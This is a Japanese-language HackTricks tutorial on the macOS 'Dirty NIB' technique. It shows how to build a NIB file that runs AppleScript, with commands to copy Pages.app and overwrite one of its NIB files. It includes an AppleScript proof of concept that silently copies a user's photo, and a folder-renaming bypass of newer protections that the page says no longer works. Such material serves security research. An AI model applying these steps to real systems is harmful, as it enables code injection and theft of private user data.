# macOS Dirty NIB

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) を使って AWS ハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks にあなたの会社を広告掲載したい場合**や**HackTricks を PDF でダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式 PEASS & HackTricks グッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegram グループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の github リポジトリに PR を提出して、あなたのハッキングのコツを**共有する**。

</details>

**このテクニックは投稿から取られました** [**https://blog.xpnsec.com/dirtynib/**](https://blog.xpnsec.com/dirtynib/)

## 基本情報

NIB ファイルは Apple の開発エコシステムで使用され、アプリケーション内の**ユーザーインターフェース (UI) 要素**とその相互作用を**定義する**ために使用されます。Interface Builder ツールで作成され、ウィンドウ、ボタン、テキストフィールドなどの**シリアライズされたオブジェクト**を含み、実行時に設計された UI を表示するためにロードされます。Apple はまだこれを使用していますが、アプリケーションの UI フローのより視覚的な表現のために、Storyboard への移行を推奨しています。

{% hint style="danger" %}
さらに、**NIB ファイル**は**任意のコマンドを実行する**ためにも使用でき、アプリ内の NIB ファイルが変更されても、**Gatekeeper はアプリの実行を許可する**ため、アプリケーション内で**任意のコマンドを実行する**ために使用できます。
{% endhint %}

## Dirty NIB インジェクション <a href="#dirtynib" id="dirtynib"></a>

まず、新しい NIB ファイルを作成する必要があります。大部分の構築には XCode を使用します。インターフェースにオブジェクトを追加し、クラスを NSAppleScript に設定します：

<figure><img src="../../../.gitbook/assets/image (681).png" alt="" width="380"><figcaption></figcaption></figure>

オブジェクトには、User Defined Runtime Attributes を使用して初期 `source` プロパティを設定する必要があります：

<figure><img src="../../../.gitbook/assets/image (682).png" alt="" width="563"><figcaption></figcaption></figure>

これにより、要求に応じて **AppleScript を実行する**コード実行ガジェットが設定されます。AppleScript の実行を実際にトリガーするために、今のところボタンを追加します（もちろんこれには創造性を発揮できます ;)。ボタンは作成したばかりの `Apple Script` オブジェクトにバインドされ、`executeAndReturnError:` セレクターを**呼び出します**：

<figure><img src="../../../.gitbook/assets/image (683).png" alt="" width="563"><figcaption></figcaption></figure>

テスト用には、とりあえず Apple Script を使用します：
```bash
set theDialogText to "PWND"
display dialog theDialogText
```
XCodeデバッガーでこれを実行し、ボタンを押すと：

<figure><img src="../../../.gitbook/assets/image (684).png" alt="" width="563"><figcaption></figcaption></figure>

NIBから任意のAppleScriptコードを実行する能力を持っているので、次にターゲットが必要です。初期デモのために、もちろんAppleのアプリケーションであり、私たちによって変更可能であるべきではないPagesを選びましょう。

まず、アプリケーションのコピーを`/tmp/`に取ります：
```bash
cp -a -X /Applications/Pages.app /tmp/
```
アプリケーションを起動して、Gatekeeperの問題を避け、キャッシュを許可します：
```bash
open -W -g -j /Applications/Pages.app
```
アプリを初めて起動（そして終了）した後、既存のNIBファイルをDirtyNIBファイルで上書きする必要があります。デモの目的で、実行を制御できるようにAbout Panel NIBを上書きします：
```bash
cp /tmp/Dirty.nib /tmp/Pages.app/Contents/Resources/Base.lproj/TMAAboutPanel.nib
```
nibを上書きしたら、`About` メニューアイテムを選択することで実行をトリガーできます：

<figure><img src="../../../.gitbook/assets/image (685).png" alt="" width="563"><figcaption></figcaption></figure>

Pagesをもう少し詳しく見ると、ユーザーのPhotosへのアクセスを許可するプライベートな権限があることがわかります：

<figure><img src="../../../.gitbook/assets/image (686).png" alt="" width="479"><figcaption></figcaption></figure>

したがって、**AppleScriptを変更して、ユーザーにプロンプトを表示せずに写真を盗む** POCをテストできます：

{% code overflow="wrap" %}
```applescript
use framework "Cocoa"
use framework "Foundation"

set grabbed to current application's NSData's dataWithContentsOfFile:"/Users/xpn/Pictures/Photos Library.photoslibrary/originals/6/68CD9A98-E591-4D39-B038-E1B3F982C902.gif"

grabbed's writeToFile:"/Users/xpn/Library/Containers/com.apple.iWork.Pages/Data/wtf.gif" atomically:1
```
{% endcode %}

{% hint style="danger" %}
[**悪意のある .xib ファイルの例で任意のコードを実行します。**](https://gist.github.com/xpn/16bfbe5a3f64fedfcc1822d0562636b4)
{% endhint %}

## 自分の DirtyNIB を作成する



## 起動制約

これらは基本的に**予想される場所以外でのアプリケーションの実行を防ぐ**ため、起動制約で保護されているアプリケーションを `/tmp` にコピーした場合、実行することはできません。\
[**この投稿で詳細を見る**](../macos-security-protections/#launch-constraints)**。**

しかし、ファイル **`/System/Volumes/Preboot/*/boot/*/usr/standalone/firmware/FUD/StaticTrustCache.img4`** を解析すると、起動制約で保護されていない**アプリケーションがまだ見つかります**ので、**それら**に任意の場所に **NIB** ファイルを**注入**することができます（これらのアプリを見つける方法については、前のリンクを確認してください）。

## 追加の保護

macOS Somona から、アプリ内に書き込むことを防ぐ保護がいくつかあります。しかし、バイナリのコピーを実行する前に Contents フォルダの名前を変更することで、この保護を回避することが可能です：

1. `CarPlay Simulator.app` のコピーを `/tmp/` に取る
2. `/tmp/Carplay Simulator.app/Contents` を `/tmp/CarPlay Simulator.app/NotCon` に名前を変更する
3. Gatekeeper 内でキャッシュするためにバイナリ `/tmp/CarPlay Simulator.app/NotCon/MacOS/CarPlay Simulator` を起動する
4. `NotCon/Resources/Base.lproj/MainMenu.nib` を私たちの `Dirty.nib` ファイルで上書きする
5. `/tmp/CarPlay Simulator.app/Contents` に名前を変更する
6. `CarPlay Simulator.app` を再度起動する

{% hint style="success" %}
macOS はアプリケーションバンドル内のファイルの変更を**防ぐ**ため、これはもはや可能ではないようです。\
したがって、Gatekeeper でアプリをキャッシュした後、バンドルを変更することはできません。\
そして例えば Contents ディレクトリの名前を **NotCon** に変更し（上記のエクスプロイトで示されているように）、Gatekeeper でキャッシュするためにアプリのメインバイナリを実行すると、**エラーが発生し実行されません**。
{% endhint %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) で AWS ハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricks をサポートする他の方法：

* **HackTricks に広告を掲載したい**、または **HackTricks を PDF でダウンロードしたい** 場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式 PEASS & HackTricks グッズ**](https://peass.creator-spring.com) を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFT**](https://opensea.io/collection/the-peass-family) コレクションをチェックする
* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) に**参加する**か、[**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) を**フォローする**。
* **HackTricks** の GitHub リポジトリ [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) に PR を提出して、あなたのハッキングのコツを共有する。

</details>
